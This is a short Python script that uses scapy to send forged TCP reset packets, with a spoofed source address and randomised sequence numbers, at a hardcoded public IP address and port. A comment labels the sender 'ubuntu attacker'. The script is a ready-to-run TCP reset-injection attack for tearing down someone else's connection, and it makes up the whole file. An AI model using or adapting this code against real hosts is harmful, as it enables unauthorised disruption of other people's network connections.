from scapy.all import send, IP, TCP
import time
import numpy as np

def send_rst(src_addr,
             dst_addr,
             src_port,
             dst_port,
             last_seq,
             ):
    # Create IP layer
    ip_layer = IP(src=src_addr, dst=dst_addr)
    
    # Create TCP layer with RST flag set
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="R", seq=last_seq + 0, window=502)
    
    # Combine the layers into a single packet
    rst_packet = ip_layer / tcp_layer
    
    # Send the packet
    send(rst_packet)
    print("Sent")

# ubuntu attacker: 
# NAT address: 

def spam_tcp_rst():
    seq = 3868373829
    # seq = 11111
    # ack = 2602968657
    for _ in range(15):
        seq = np.random.randint(1 << 32)
        send_rst(src_addr="192.168.2.18",
                 dst_addr="82.157.125.228",
                 src_port=40340,
                 dst_port=8002,
                 last_seq=seq)

if __name__ == '__main__':
    # src_port = 2345
    # last_seq = 268
    # send_rst("192.168.1.201", "192.168.1.54", src_port, 1234, last_seq)

    # send(IP(src="", dst="")/TCP(sport=57994, dport=8001, seq=1475153678))
    
    spam_tcp_rst()
